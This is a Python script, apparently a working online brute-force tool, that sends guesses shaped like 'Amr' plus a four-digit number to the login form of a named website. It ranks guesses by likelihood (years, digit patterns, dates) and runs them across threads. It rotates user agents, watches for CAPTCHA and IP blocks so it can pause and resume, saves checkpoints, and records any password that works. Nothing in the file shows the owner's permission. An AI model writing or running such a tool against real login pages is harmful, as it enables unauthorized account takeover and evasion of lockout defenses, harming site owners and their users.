import requests
import time
import random
import concurrent.futures
import threading
import logging
import os
import json
from datetime import datetime
import multiprocessing
import signal
import sys
import math
from urllib3.util.retry import Retry
from requests.adapters import HTTPAdapter
import asyncio

# Global variables
json_log_file = None
callback_function = None
global_session = None
session_lock = threading.Lock()

# Add connection pool metrics
connection_stats = {
    "created": 0,
    "reused": 0,
    "errors": 0,
    "active": 0
}

# Add adaptive rate limiting
class AdaptiveRateLimiter:
    def __init__(self, initial_delay=0.1, min_delay=0.05, max_delay=2.0):
        self.current_delay = initial_delay
        self.min_delay = min_delay
        self.max_delay = max_delay
        self.success_streak = 0
        self.failure_streak = 0
        self.lock = threading.Lock()
    
    def get_delay(self):
        with self.lock:
            return self.current_delay
    
    def adjust_after_request(self, success, response_time=None):
        with self.lock:
            # If got a successful response
            if success:
                self.success_streak += 1
                self.failure_streak = 0
                
                # Speed up after consistent successes
                if self.success_streak > 5:
                    self.current_delay = max(self.min_delay, self.current_delay * 0.9)
            else:
                self.failure_streak += 1
                self.success_streak = 0
                
                # Slow down after failures
                if self.failure_streak > 2:
                    self.current_delay = min(self.max_delay, self.current_delay * 1.5)
            
            # Adjust based on response time if provided
            if response_time and response_time > 1.0:
                # Site is slow, back off
                self.current_delay = min(self.max_delay, self.current_delay * 1.2)

# Initialize the rate limiter
rate_limiter = AdaptiveRateLimiter()

def log_message(message, level="info"):
    """Log a message with the specified level"""
    if level == "debug":
        logging.debug(message)
    elif level == "info":
        logging.info(message)
    elif level == "warning":
        logging.warning(message)
    elif level == "error":
        logging.error(message)
    elif level == "critical":
        logging.critical(message)
    else:
        logging.info(message)

def generate_password(number):
    """Generate password in format Amr + 4-digit number"""
    # Ensure number is 4 digits
    if number < 1000 or number > 9999:
        raise ValueError(f"Number {number} is not a 4-digit number (1000-9999)")
    return f"Amr{number}"

def get_global_session():
    """Get or create a global session with improved connection pooling"""
    global global_session, connection_stats
    
    with session_lock:
        if global_session is None:
            global_session = setup_session_with_retries()
            connection_stats["created"] += 1
        else:
            connection_stats["reused"] += 1
            
        connection_stats["active"] += 1
        return global_session

def setup_session_with_retries():
    """Create a session with retry logic and connection pooling"""
    session = requests.Session()
    
    # Configure retry strategy
    retries = Retry(
        total=3,
        backoff_factor=0.5,
        status_forcelist=[429, 500, 502, 503, 504],
        allowed_methods=["POST", "GET"]
    )
    
    # Add random user agent
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1"
    ]
    
    session.headers.update({"User-Agent": random.choice(user_agents)})
    
    # Mount it for both http and https usage
    adapter = HTTPAdapter(max_retries=retries, pool_connections=10, pool_maxsize=20)
    session.mount("http://", adapter)
    session.mount("https://", adapter)
    
    return session

def create_session():
    """Return the global session or create a new one if needed"""
    try:
        return get_global_session()
    except Exception as e:
        log_message(f"Error getting global session: {e}", "error")
        # Fall back to creating a new session
        return setup_session_with_retries()

def test_password(password, url, session_factory):
    """Test if password works with better memory management"""
    # Create a new session for this thread
    session = session_factory()
    
    try:
        # Prepare the form data - no change needed
        form_data = {
            "ps": password,
            "su": "Continue"
        }
        
        # Send POST request with the password
        start_time = time.time()
        response = session.post(url, data=form_data)
        response_time = time.time() - start_time
        
        # Check for blocking conditions
        if response.status_code in (403, 429):
            log_message(f"WARNING: Possible IP blocking (status {response.status_code})", "warning")
            time.sleep(5)
            return False, password
            
        if "captcha" in response.text.lower() or "blocked" in response.text.lower():
            log_message("WARNING: CAPTCHA or IP blocking detected", "warning")
            time.sleep(10)
            return False, password
        
        # Collect minimal response info to reduce memory usage
        response_info = {
            "status_code": response.status_code,
            "url": response.url,
            "response_time": response_time,
            "content_length": len(response.text)
            # Only keep essential headers, not the full dict
        }
        
        # Quick success check to avoid excessive parsing
        result = "SC.php" in response.url
        
        # Only do more detailed parsing if not obviously successful
        if not result:
            # Failure indicator: Use more efficient checks
            result = not ("<span" in response.text and "color:red" in response.text and "Error password" in response.text)
        
        # Log attempt with minimal info
        log_attempt(password, result, response_info)
        
        # Explicitly clear large response object
        del response
        
        return result, password
        
    except Exception as e:
        log_message(f"Error testing password {password}: {str(e)}", "error")
        log_attempt(password, False, {"error": str(e)})
        return False, password
    finally:
        # Track session usage
        release_session(session)

def log_attempt(password, result, response_info=None):
    """Log details about a password attempt"""
    global json_log_file
    
    status = "SUCCESS" if result else "FAILED"
    log_data = {
        "timestamp": datetime.now().isoformat(),
        "password": password,
        "status": status,
        "response_info": response_info
    }
    
    # Log to the main log file
    log_message(f"Password attempt: {password} - {status}")
    
    # Clean up memory-intensive parts of response_info before logging
    if response_info and "headers" in response_info:
        # Keep only essential headers
        essential_headers = ["Content-Type", "Content-Length", "Location", "Server"]
        response_info["headers"] = {k: v for k, v in response_info["headers"].items() 
                                  if k in essential_headers}
    
    # Also save detailed JSON logs for later analysis
    try:
        # First check if json_log_file is defined
        if json_log_file:
            with open(json_log_file, "a") as f:
                f.write(json.dumps(log_data) + "\n")
        else:
            # Fallback if json_log_file is not defined
            fallback_path = "logs/detailed_attempts_fallback.json"
            with open(fallback_path, "a") as f:
                f.write(json.dumps(log_data) + "\n")
            log_message(f"Using fallback log file: {fallback_path}", "warning")
    except Exception as e:
        log_message(f"Error writing to JSON log: {e}", "error")

def setup_logging():
    """Set up logging to file and console"""
    global json_log_file  # Declare we'll use the global variable
    
    # Create logs directory if it doesn't exist
    if not os.path.exists('logs'):
        os.makedirs('logs')
    
    # Create a unique log filename with timestamp
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    log_file = f"logs/password_test_{timestamp}.log"
    
    # Configure logging
    logging.basicConfig(
        level=logging.INFO,
        format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
        handlers=[
            logging.FileHandler(log_file),
            logging.StreamHandler()  # Also output to console
        ]
    )
    
    # Create JSON log file for detailed attempts
    json_log_file = f"logs/detailed_attempts_{timestamp}.json"
    with open(json_log_file, "w") as f:
        f.write("")  # Create empty file
    
    logging.info(f"Logging initialized. Log file: {log_file}")
    logging.info(f"Detailed JSON logs: {json_log_file}")
    
    return log_file, json_log_file

def get_prioritized_numbers():
    """Return a list of numbers prioritized by likelihood of being a password"""
    log_message("Generating prioritized number list...")
    all_numbers = []
    
    # Priority 1: Years (recent years, common era years, etc.)
    years = []
    # Recent years (people often use birth years, graduation years, etc.)
    years.extend(range(1970, 2024))
    # Add years that might be significant (2000, 2020, etc.)
    special_years = [2000, 2010, 2020, 1900, 1950]
    years.extend(special_years)
    # Ensure all are 4 digits
    years = [year for year in years if 1000 <= year <= 9999]
    
    # Priority 2: Common number patterns (ensure all are 4 digits)
    patterns = [
        # Repeated digits
        1111, 2222, 3333, 4444, 5555, 6666, 7777, 8888, 9999,
        # Sequential ascending
        1234, 2345, 3456, 4567, 5678, 6789,
        # Sequential descending
        9876, 8765, 7654, 6543, 5432, 4321,
        # Alternating patterns
        1212, 1313, 1414, 1515, 2323, 2424, 2525, 3434, 3535, 4545, 5656,
        # Common combinations
        1122, 1133, 1144, 2233, 2244, 3344, 1221, 1331, 1441, 2332, 2442, 3443,
        # Keyboard patterns (numeric keypad)
        1357, 2468, 1397, 1793, 2580, 1852, 1470, 1741, 1590, 1951
    ]
    
    # Priority 3: Dates (MMDD and DDMM formats - common birthdays, anniversaries)
    dates = []
    for month in range(1, 13):
        for day in range(1, 32):
            if (month == 2 and day > 29) or ((month in [4, 6, 9, 11]) and day > 30):
                continue
            # MMDD format
            mmdd = month * 100 + day
            # DDMM format
            ddmm = day * 100 + month
            
            # Ensure they're 4-digit numbers
            if 1000 <= mmdd <= 9999:
                dates.append(mmdd)
            if 1000 <= ddmm <= 9999:
                dates.append(ddmm)
    
    # Priority 4: Special dates (holidays, etc.)
    special_dates = [
        1225,  # Christmas
        1031,  # Halloween
        1101,  # New Year (0101)
        1704,  # Independence Day (US) (0704)
        1314,  # Pi Day (0314)
        1111,  # Singles' Day / Veterans Day
        1212   # Universal hour
    ]
    
    # Combine all priorities
    all_numbers.extend(years)
    all_numbers.extend(patterns)
    all_numbers.extend(dates)
    all_numbers.extend(special_dates)
    
    # Apply divide and conquer for remaining numbers (descending order)
    # First test middle range (5000-9999) in descending order
    high_range = list(range(9999, 4999, -1))
    # Then test lower range (1000-4999) in descending order
    low_range = list(range(4999, 999, -1))
    
    # Add remaining numbers that aren't already included
    remaining = []
    for n in high_range + low_range:
        if n not in all_numbers and 1000 <= n <= 9999:
            remaining.append(n)
    
    all_numbers.extend(remaining)
    
    # Final check to ensure all numbers are 4 digits
    all_numbers = [n for n in all_numbers if 1000 <= n <= 9999]
    
    log_message(f"Generated list of {len(all_numbers)} prioritized numbers")
    return all_numbers

def save_checkpoint(last_number, success_stats=None):
    """Save the current progress to a checkpoint file"""
    checkpoint_data = {
        "last_number": last_number,
        "timestamp": datetime.now().isoformat(),
        "stats": success_stats or {}
    }
    
    try:
        with open("password_checkpoint.json", "w") as f:
            json.dump(checkpoint_data, f)
            
        log_message(f"Checkpoint saved at number {last_number}")
    except Exception as e:
        log_message(f"Error saving checkpoint: {e}", "error")

def load_checkpoint():
    """Load the last checkpoint if it exists"""
    try:
        with open("password_checkpoint.json", "r") as f:
            checkpoint_data = json.load(f)
            log_message(f"Loaded checkpoint from: {checkpoint_data['timestamp']}")
            if "stats" in checkpoint_data:
                log_message(f"Previous run statistics: {checkpoint_data['stats']}")
            return checkpoint_data["last_number"]
    except FileNotFoundError:
        log_message("No checkpoint found, starting from beginning", "info")
        return 1000  # Default starting point
    except Exception as e:
        log_message(f"Error loading checkpoint: {e}", "error")
        return 1000

def get_optimal_worker_count(network_intensive=True):
    """Determine the optimal number of worker threads based on system resources"""
    try:
        # Get CPU count but limit to a reasonable range
        cpu_count = multiprocessing.cpu_count()
        
        # For network-intensive operations like password testing, we want fewer workers
        if network_intensive:
            if cpu_count <= 2:
                return 2
            elif cpu_count <= 4:
                return 3
            elif cpu_count <= 8:
                return 5
            else:
                return 8  # Cap at 8 workers to avoid overwhelming the server
        # For CPU-intensive operations, we can use more workers
        else:
            return max(2, cpu_count - 1)  # Leave one CPU for system
    except Exception as e:
        log_message(f"Error determining worker count: {e}", "error")
        return 4  # Default to 4 workers as a safe value

def calculate_eta(current, total, elapsed):
    """Calculate estimated time to completion"""
    if current == 0 or elapsed == 0:
        return "Unknown"
    
    rate = current / elapsed
    remaining = (total - current) / rate if rate > 0 else 0
    
    # Format the remaining time
    if remaining < 60:
        return f"{remaining:.1f} seconds"
    elif remaining < 3600:
        return f"{remaining/60:.1f} minutes"
    else:
        return f"{remaining/3600:.1f} hours"

def process_batch(batch, login_url, counter_lock, attempts, start_time, success_found, successful_password, 
                  json_log_file, batch_id=0, total_passwords=9000):
    """Process a batch of password numbers"""
    # Track response times to adapt delay
    recent_response_times = []
    current_delay = 0.05  # Start with minimal delay
    
    # Setup batch-specific statistics
    batch_start_time = time.time()
    batch_attempts = 0
    successful = False
    
    for number in batch:
        if success_found.is_set():
            # Another batch found the password
            log_message(f"Batch {batch_id}: Stopping as success was found by another worker")
            return
            
        password = generate_password(number)
        batch_attempts += 1
        
        with counter_lock:
            attempts[0] += 1
            current_attempt = attempts[0]
        
        # Display progress with correct total
        if current_attempt % 50 == 0:
            elapsed = time.time() - start_time
            rate = current_attempt / elapsed if elapsed > 0 else 0
            percent_complete = (current_attempt / total_passwords) * 100
            eta = calculate_eta(current_attempt, total_passwords, elapsed)
            
            progress_msg = f"Progress: {current_attempt}/{total_passwords} ({percent_complete:.1f}%)"
            log_message(progress_msg)
            log_message(f"Elapsed time: {elapsed:.2f} seconds")
            log_message(f"Rate: {rate:.2f} passwords/second")
            log_message(f"Current password: {password}")
            log_message(f"Current delay: {current_delay:.3f} seconds")
            log_message(f"ETA: {eta}")
            
            # Report progress to callback if available
            if callback_function:
                callback_function(False, None, 0, 0, current_attempt, total_passwords)
        elif current_attempt % 10 == 0:
            # Simple progress indicator
            print(".", end="", flush=True)
            # Report more frequent progress updates to the callback
            if callback_function and current_attempt % 25 == 0:
                callback_function(False, None, 0, 0, current_attempt, total_passwords)
        
        # Test this password
        result, successful_pwd = test_password(password, login_url, create_session)
        
        if result:
            log_message(f"Success! Password found: {successful_pwd}", "critical")
            with counter_lock:
                if not success_found.is_set():
                    success_found.set()
                    successful_password[0] = successful_pwd
                    successful = True
                    
                    # Save the successful password details
                    try:
                        success_details = {
                            "password": successful_pwd,
                            "timestamp": datetime.now().isoformat(),
                            "attempts": current_attempt,
                            "elapsed_seconds": time.time() - start_time,
                            "batch_id": batch_id
                        }
                        with open("success_details.json", "w") as f:
                            json.dump(success_details, f, indent=2)
                    except Exception as e:
                        log_message(f"Error saving success details: {e}", "error")
                        
            # When calling the callback from a thread, wrap it safely
            if successful and callback_function:
                # Track which batch found it
                log_message(f"Successful password found in batch {batch_id}: {password}", "critical")
                
                # Create a safe callback that works from any thread
                try:
                    current_batch_progress = batch_attempts
                    with counter_lock:
                        total_attempts = attempts[0]
                    
                    elapsed = time.time() - start_time
                    
                    # Thread-safe callback that works with asyncio
                    if threading.current_thread() is not threading.main_thread():
                        # Get event loop from the main thread if possible
                        try:
                            loop = asyncio.get_event_loop_policy().get_event_loop()
                            future = asyncio.run_coroutine_threadsafe(
                                asyncio.to_thread(callback_function, True, password, total_attempts, elapsed, 
                                                 current_batch_progress, total_passwords),
                                loop
                            )
                        except RuntimeError:
                            # Fallback if can't get main event loop
                            log_message("Could not access main event loop, using direct callback", "warning")
                            callback_function(True, password, total_attempts, elapsed, 
                                             current_batch_progress, total_passwords)
                    else:
                        # Direct call if somehow in main thread
                        callback_function(True, password, total_attempts, elapsed, 
                                         current_batch_progress, total_passwords)
                except Exception as e:
                    log_message(f"Error in thread callback: {e}", "error")
                    
            return successful
        
        # Add a dynamic delay to avoid overwhelming the server
        try:
            response_time = 0.1  # Default if not available
            if hasattr(result, 'response_time'):
                response_time = result.response_time
                
            # Keep a moving average of recent response times
            recent_response_times.append(response_time)
            if len(recent_response_times) > 10:
                recent_response_times.pop(0)
                
            # Calculate adaptive delay based on response times
            avg_response_time = sum(recent_response_times) / len(recent_response_times)
            
            # Scale delay - slower responses = more delay
            if avg_response_time > 1.0:  # Very slow responses
                current_delay = min(1.0, avg_response_time / 5)  # Cap at 1 second
            elif avg_response_time > 0.5:  # Moderately slow
                current_delay = avg_response_time / 10
            else:  # Fast responses
                current_delay = 0.05  # Minimal delay
                
            # Adjust rate limit based on result
            rate_limiter.adjust_after_request(result, response_time)
            
            # Apply the delay
            time.sleep(current_delay)
        except Exception as e:
            log_message(f"Error in adaptive delay: {e}", "warning")
            time.sleep(0.1)  # Fallback delay
            
    return successful

def signal_handler(sig, frame):
    """Handle Ctrl+C signal to gracefully shut down"""
    log_message("Interrupt received, saving checkpoint and exiting...", "warning")
    try:
        # Try to save checkpoint before exiting
        save_checkpoint(9999, {"stopped_by": "user_interrupt"})
    except Exception as e:
        log_message(f"Error saving final checkpoint: {e}", "error")
    
    sys.exit(0)

def run_password_test(callback=None):
    """Run password test with improved error handling and resource management"""
    global callback_function
    callback_function = callback
    
    # Create resources that need cleanup
    created_sessions = []
    
    try:
        # Get the target URL from config if available
        url = "https://amr-elsherif.net/"
        try:
            if os.path.exists('config.json'):
                with open('config.json', 'r') as f:
                    config = json.load(f)
                    if 'target_url' in config:
                        url = config['target_url']
        except Exception as e:
            log_message(f"Error reading URL from config: {e}", "warning")
        
        try:
            # Setup logging
            log_file, json_log_file_path = setup_logging()
            log_message("Password Testing Script Started")
            log_message(f"Target URL: {url}")
            
            # Get prioritized numbers
            all_numbers = get_prioritized_numbers()
            
            # Validate all numbers are 4 digits
            invalid_numbers = [n for n in all_numbers if n < 1000 or n > 9999]
            if invalid_numbers:
                log_message(f"WARNING: Found {len(invalid_numbers)} invalid numbers in the test set", "warning")
                log_message("Filtering out invalid numbers...")
                all_numbers = [n for n in all_numbers if n >= 1000 and n <= 9999]
            
            log_message(f"Testing {len(all_numbers)} passwords in prioritized order")
            total_passwords = len(all_numbers)
            
            # Send initial progress update with total count
            if callback_function:
                callback_function(False, None, 0, 0, 0, total_passwords)
            
            # Track attempts
            attempts = [0]  # Using a list for mutable reference
            start_time = time.time()
            
            # Thread-safe counter
            counter_lock = threading.Lock()
            success_found = threading.Event()
            successful_password = [None]  # Using a list to store the result
            
            log_message("=" * 50)
            log_message("Password Testing Script Started")
            log_message(f"Log file: {log_file}")
            log_message(f"Target URL: {url}")
            log_message("Testing passwords in format: Amr[1000-9999] with enhanced smart prioritization")
            log_message("=" * 50)
            
            # Dynamically determine batch size based on total passwords
            batch_size = min(100, max(10, total_passwords // 1000))
            log_message(f"Using batch size of {batch_size} passwords")
            
            # Create batches of numbers to test
            batches = [all_numbers[i:i+batch_size] for i in range(0, len(all_numbers), batch_size)]
            
            # Use ThreadPoolExecutor to test passwords in parallel
            max_workers = get_optimal_worker_count(network_intensive=True)
            log_message(f"Starting parallel testing with {max_workers} workers")
            
            # Create a semaphore to limit concurrent requests
            request_semaphore = threading.Semaphore(max_workers)
            
            with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
                futures = []
                
                # Submit batch processing tasks with batch IDs
                for i, batch in enumerate(batches):
                    future = executor.submit(
                        process_batch, 
                        batch, 
                        url, 
                        counter_lock, 
                        attempts, 
                        start_time, 
                        success_found, 
                        successful_password,
                        json_log_file_path,
                        i,
                        total_passwords
                    )
                    futures.append(future)
                
                # Wait for either all futures to complete or a success to be found
                completed = 0
                for i, future in enumerate(concurrent.futures.as_completed(futures)):
                    try:
                        result = future.result()
                        if result:
                            log_message("Password found by a worker thread!", "critical")
                    except Exception as e:
                        log_message(f"Error in future {i}: {e}", "error")
                    
                    completed += 1
                    
                    if i % 5 == 0 or completed % 50 == 0:
                        # Save checkpoint periodically
                        current_batch_idx = i * batch_size
                        if current_batch_idx < len(all_numbers):
                            current_num = all_numbers[current_batch_idx]
                            
                            # Add stats to checkpoint
                            elapsed = time.time() - start_time
                            current_stats = {
                                "attempts": attempts[0],
                                "elapsed": f"{elapsed:.2f} seconds",
                                "rate": f"{attempts[0]/elapsed:.2f} passwords/second" if elapsed > 0 else "0",
                                "completed_batches": completed,
                                "total_batches": len(batches),
                                "percent_complete": f"{(completed/len(batches))*100:.1f}%"
                            }
                            
                            save_checkpoint(current_num, current_stats)
                            
                    if success_found.is_set():
                        # Cancel all remaining futures
                        log_message("Success found! Cancelling remaining tasks...")
                        for f in futures:
                            if not f.done():
                                f.cancel()
                        break
            
            elapsed = time.time() - start_time
            if not success_found.is_set():
                log_message("All passwords tested. No successful login found.", "warning")
            
            log_message(f"Script completed in {elapsed:.2f} seconds")
            log_message(f"Tested {attempts[0]} passwords")
            
            # Generate summary statistics
            log_message("=== Testing Summary ===")
            log_message(f"Total passwords tested: {attempts[0]}")
            log_message(f"Total time: {elapsed:.2f} seconds")
            log_message(f"Average rate: {attempts[0]/elapsed:.2f} passwords/second" if elapsed > 0 else "0")
            
            if successful_password[0]:
                log_message(f"Successful password: {successful_password[0]}")
                if callback_function:
                    callback_function(True, successful_password[0], attempts[0], elapsed, 0, total_passwords)
                return True, successful_password[0]
            else:
                if callback_function:
                    callback_function(False, None, attempts[0], elapsed, 0, total_passwords)
                return False, None
            
        except KeyboardInterrupt:
            log_message("Password test interrupted by user", "warning")
            # Clean shutdown
            if callback_function:
                callback_function(False, None, attempts[0], time.time() - start_time, 0, 0)
            return False, None
        except Exception as e:
            log_message(f"Critical error in password test: {e}", "critical")
            # Include traceback in logs
            import traceback
            log_message(f"Traceback: {traceback.format_exc()}", "critical")
            
            if callback_function:
                callback_function(False, None, 0, 0, 0, 0)
            return False, None
        finally:
            # Always clean up resources
            for session in created_sessions:
                try:
                    session.close()
                except:
                    pass
            
    except Exception as e:
        log_message(f"Critical error in password test: {e}", "critical")
        if callback_function:
            callback_function(False, None, 0, 0, 0, 0)
        return False, None

# Optimize verify_password with progressive validation
def verify_password(password, url=None):
    """Check if password is valid with multi-stage validation"""
    if not password:
        return False
    
    if not url:
        url = "https://amr-elsherif.net/"
    
    log_message(f"Verifying password: {password}")
    
    try:
        # First try - standard check
        session = get_global_session()
        result, _ = test_password(password, url, lambda: session)
        
        if result:
            log_message(f"Password verification successful: {password}", "info")
            return True
            
        # If failed, try again with a new session in case of connection issues
        log_message(f"First verification attempt failed, trying again with new session", "warning")
        new_session = setup_session_with_retries()  # Fresh session
        result, _ = test_password(password, url, lambda: new_session)
        
        log_message(f"Second verification attempt: {'SUCCESS' if result else 'FAILED'}", 
                    "info" if result else "warning")
        return result
    except Exception as e:
        log_message(f"Error verifying password: {e}", "error")
        return False

# Add session release function
def release_session(session):
    """Track when sessions are released"""
    global connection_stats
    with session_lock:
        connection_stats["active"] -= 1

# If run directly, just execute the password test
if __name__ == "__main__":
    success, password = run_password_test()
    if success:
        print(f"Password found: {password}")
    else:
        print("Password not found") 